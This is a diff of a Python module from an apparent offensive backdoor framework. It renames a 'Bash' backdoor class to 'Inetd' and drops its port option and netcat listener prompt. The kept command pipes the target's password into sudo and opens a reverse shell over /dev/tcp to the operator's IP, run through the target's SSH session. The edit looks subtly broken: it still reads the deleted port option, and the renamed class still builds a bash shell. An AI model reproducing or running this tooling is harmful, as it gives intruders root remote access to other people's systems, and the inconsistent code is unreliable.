@@ -1,14 +1,13 @@
 from backdoor import *
 
-class Bash(Backdoor):
-    prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET 
+class Inetd(Backdoor):
+    prompt = Fore.RED + "(inted) " + Fore.BLUE + ">> " + Fore.RESET 
     
     def __init__(self, core):
         cmd.Cmd.__init__(self)
-        self.intro = GOOD + "Using Bash backdoor..."
+        self.intro = GOOD + "Using Inetd backdoor..."
         self.core = core
         self.options = {
-                "port"   : Option("port", 53923, "port to connect to", True),
                 }
         
         self.modules = {} 
@@ -19,12 +18,10 @@ class Bash(Backdoor):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % self.get_value("port")
 
     def do_exploit(self, args):
-        port = self.get_value("port")
         target = self.core.curtarget
         print(GOOD + "Initializing backdoor...")
-        raw_input(INFO + "Please create a listener with the command nc -v -n -l -p " + str(port))
-	target.ssh.exec_command(self.get_command())
-        print(GOOD + "Bash Backdoor on port " + str(port) + " attempted. You may need to input the password, which is " + target.pword)
+        target.ssh.exec_command(self.get_command())
+        print(GOOD + "Inetd Backdoor attempted.")
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
             mod.exploit()
